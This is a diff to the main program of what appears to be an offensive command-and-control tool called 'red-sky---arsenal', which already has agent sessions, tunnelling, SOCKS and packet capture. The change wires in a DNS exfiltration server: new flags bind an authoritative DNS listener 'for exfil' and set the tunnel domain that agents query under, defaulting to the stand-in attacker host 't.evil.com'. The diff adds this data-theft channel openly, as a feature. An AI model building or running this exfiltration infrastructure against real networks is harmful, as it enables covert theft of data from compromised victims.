@@ -28,6 +28,7 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/session"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
 	"github.com/sk666G/red-sky---arsenal/internal/capturer"
+	"github.com/sk666G/red-sky---arsenal/internal/dnsexfil"
 	"github.com/sk666G/red-sky---arsenal/internal/tunnel"
 	"github.com/sk666G/red-sky---arsenal/internal/tui"
 	"github.com/sk666G/red-sky---arsenal/internal/wire"
@@ -50,6 +51,8 @@ func main() {
 	pcapIface := flag.String("pcap", "", "capture raw packets on the target interface (Linux agent only). Requires -pcap-out.")
 	pcapOut := flag.String("pcap-out", "", "path to write the capture to (.pcap)")
 	pcapDuration := flag.Duration("pcap-duration", 30*time.Second, "how long to capture")
+	dnsBind := flag.String("dns-exfil", "", "bind an authoritative DNS listener for exfil (e.g. 0.0.0.0:5353)")
+	dnsDomain := flag.String("dns-domain", "t.evil.com", "tunnel domain agents will query under")
 	flag.Parse()
 
 	if *pluginFlag != "" {
@@ -101,6 +104,16 @@ func main() {
 
 	if *socksBind != "" {
 		go startSocks(*socksBind, mgr)
+	}
+
+	if *dnsBind != "" {
+		r := dnsexfil.DefaultReassembler()
+		srv := &dnsexfil.Server{Bind: *dnsBind, Domain: *dnsDomain, Reasm: r}
+		go func() {
+			if err := srv.Start(context.Background()); err != nil {
+				log.Printf("[dnsexfil] server: %v", err)
+			}
+		}()
 	}
 
 	if *pcapIface != "" {
